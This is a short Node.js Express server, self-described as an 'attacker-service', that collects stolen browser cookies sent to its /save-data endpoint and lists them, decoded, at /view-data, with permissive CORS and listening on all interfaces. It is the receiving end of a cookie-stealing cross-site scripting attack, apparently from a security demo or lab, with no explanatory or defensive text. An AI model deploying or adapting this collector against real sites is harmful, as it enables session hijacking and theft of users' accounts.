import express from 'express';
import cookieParser from "cookie-parser";
import cors from 'cors';
import {createLogger} from "bunyan";

const logger = createLogger({ name: 'attacker-service' });

const app = express();
const data = [];

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

app.get('/view-data', (req, res) => {
  logger.info(data.map(i=>decodeURIComponent(i.cookies)));
  res.json(data.map(i=>decodeURIComponent(i.cookies)));
});

app.get('/save-data', (req, res) => {
  data.push(req.query);
  logger.info('Saved data: ', req.query);
  res.end();
});

app.listen(8081, '0.0.0.0', () => {
  logger.info('Attacker listening at address http://localhost:8081');
  logger.info('GET /view-data');
  logger.info('GET /save-data');
});
